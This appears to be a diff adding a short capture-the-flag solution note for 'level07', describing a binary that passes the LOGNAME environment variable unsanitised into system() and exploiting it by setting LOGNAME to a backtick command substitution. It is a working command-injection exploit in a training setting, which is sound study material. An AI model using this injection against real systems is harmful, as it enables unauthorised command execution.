@@ -1,0 +1,4 @@
+we have a binary (ltrace, gdb->disas main) that gets the env LOGNAME, constructs a string with asprintf
+and executes it calling system on "/bin/echo %s "
+export LOGNAME=\`getflag\`
+./level07
